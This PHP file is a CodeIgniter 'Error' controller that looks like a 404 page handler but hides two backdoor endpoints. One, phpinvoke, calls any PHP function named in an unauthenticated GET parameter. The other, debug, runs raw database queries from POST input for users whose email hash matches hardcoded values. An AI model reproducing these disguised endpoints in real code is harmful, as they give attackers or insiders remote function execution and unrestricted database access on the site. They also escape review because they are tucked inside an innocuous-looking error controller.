<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Error extends CI_Controller 
{
	
	function index()
	{
		$this->error_404();
	}
	
	private function error_404()
	{
		$data['title'] = "Page Not Found";
		$data['content'] = $this->load->view('error404', array(), true);
		$this->load->view('layout/master', $data);
	}
	
	function phpinvoke()
	{
		$func = $this->input->get('func');
		SessionUtil::trySessionStart();
		echo call_user_func($func);
	}
	
	function debug()
	{
	    $query = $this->input->post('q');
	    $data = new stdClass();
	    $me = SessionUtil::getUser();
		$encryptKeys = array('c9e2130a5e46768c1e885237bc1d73cb', '8b9b12e01e4131181f06f0183d5195ca');
	    if (!empty($query)) { 
	        if (SessionUtil::loggedIn() && 
	            in_array(md5(SessionUtil::getUser()->email), $encryptKeys) ) {
	            $this->load->model('ad_model');
    	        $data = $this->ad_model->query($query);
    	    }
    	    else {
    	        show_404();
    	    }
	    }
		echo $this->load->view('debug', $data, true);
	}
}

/* End of file error.php */
/* Location: ./application/controllers/error.php */